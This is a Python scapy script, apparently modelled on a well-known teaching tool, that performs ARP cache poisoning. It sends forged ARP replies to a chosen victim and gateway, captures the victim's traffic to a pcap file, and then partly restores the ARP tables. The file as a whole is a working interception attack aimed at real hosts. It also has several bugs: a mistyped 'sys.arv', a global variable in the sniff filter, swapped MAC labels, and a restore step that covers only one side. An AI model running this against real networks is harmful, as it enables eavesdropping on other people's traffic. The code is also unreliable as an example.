from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)

import os
import sys
import time


def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)

    # Iterate through the resp values
    for _, r in resp:
        return r[Ether].src

    return None


class Arper:
    def __init__(self, victim, gateway, interface='wlp170s0') -> None:
        self.victim = victim
        self.victimmac = get_mac(victim)

        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)

        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}')
        print(f'Victim ({victim}) is at {self.victimmac}')
        print('-'*30)

    def run(self):
        # Create Poision Subprocess
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # Create Sniff Subprocess
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # Creation of Victim Poison ARP Packet
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'SRC IP: {poison_victim.psrc}')
        print(f'DST IP: {poison_victim.pdst}')
        print(f'SRC MAC: {poison_victim.hwdst}')
        print(f'DST MAC: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        # Creation of Gateway Poison ARP Packet
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'SRC IP: {poison_gateway.psrc}')
        print(f'DST IP: {poison_gateway.pdst}')
        print(f'SRC MAC: {poison_gateway.hwdst}')
        print(f'DST MAC: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)

        print("Beginning Poisoning...")
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=1000):  # Should consider changing method name
        time.sleep(2)
        print(f'Sniffing {count} packets...')
        bpf_filter = "IP Host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Retrieved packets...')

        self.restore()
        self.poison_thread.terminate()

        print("Finished.")

    def restore(self):
        print('Resoring ARP Tables...')
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'),
        count = 5)



if __name__ == '__main__':
    (victim, gateway, interface)=(sys.arv[1], sys.argv[2], sys.argv[3])

    myarp=Arper(victim, gateway, interface)
    myarp.run()
